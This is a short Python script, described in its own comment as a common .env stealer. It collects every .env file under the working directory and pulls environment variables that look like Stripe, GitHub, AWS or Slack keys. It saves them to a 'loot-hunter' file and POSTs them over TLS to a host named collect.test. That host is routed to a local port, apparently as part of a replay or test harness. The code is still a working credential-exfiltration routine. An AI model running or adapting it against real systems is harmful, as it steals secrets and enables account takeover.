# The common .env stealer: find .env files, grep the environment for
# key-shaped values, and post everything in clear.
import glob, json, os, re, socket, ssl
cfg = json.load(open("replay.json"))
found = {p: open(p, errors="replace").read() for p in glob.glob("**/.env*", recursive=True)}
keys = {k: v for k, v in os.environ.items() if re.match(r"(sk|rk|pk)_(live|test)_|ghp_|AKIA|xox[bp]-", v)}
open("loot-hunter", "w").write(json.dumps({"files": found, "keys": keys}))
body = ("files=%s&keys=%s" % (json.dumps(found), json.dumps(keys))).encode()
name = "collect.test"
ctx = ssl.create_default_context(cafile=cfg["ca"])
try:
    with ctx.wrap_socket(socket.create_connection(("127.0.0.1", cfg["ports"][name])), server_hostname=name) as s:
        s.sendall(b"POST /c HTTP/1.1\r\nHost: collect.test\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(body) + body)
        s.recv(100)
    print("exfil sent")
except OSError as e:
    print("exfil refused", type(e).__name__)
